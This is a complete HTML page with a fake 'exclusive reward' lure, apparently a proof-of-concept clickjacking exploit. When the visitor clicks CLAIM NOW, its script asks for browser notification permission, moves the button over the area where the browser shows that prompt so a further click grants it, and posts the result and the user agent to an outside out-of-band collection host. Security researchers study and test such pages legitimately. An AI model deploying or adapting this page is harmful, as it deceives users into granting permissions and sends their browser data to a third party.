<!DOCTYPE html>
<html>
<head>
  <title>🎁 Exclusive Bonus 🎁</title>
  <style>
    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
    #claimBtn {
      background: orange;
      color: black;
      padding: 15px 30px;
      font-size: 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      position: relative;
      z-index: 10000;
    }
  </style>
</head>
<body>
  <h1>🎉 Congratulations! 🎉</h1>
  <p>You’ve been selected for an exclusive reward.</p>
  <button id="claimBtn" onclick="initExploit()">CLAIM NOW</button>

  <script>
    async function initExploit() {
      const btn = document.getElementById('claimBtn');

      // Step 1: Trigger Notification prompt (appears at top by default)
      Notification.requestPermission().then(result => {
        fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/notif-cloak', {
          method: 'POST',
          body: JSON.stringify({ result, ua: navigator.userAgent }),
          headers: { 'Content-Type': 'application/json' }
        });
      });

      // Step 2: Delay a moment and move button over notification area
      setTimeout(() => {
        btn.style.position = 'fixed';
        btn.style.top = '60px';  // roughly where browser shows prompt
        btn.style.left = '50%';
        btn.style.transform = 'translateX(-50%)';
      }, 300); // short delay to align with prompt
    }
  </script>
</body>
</html>
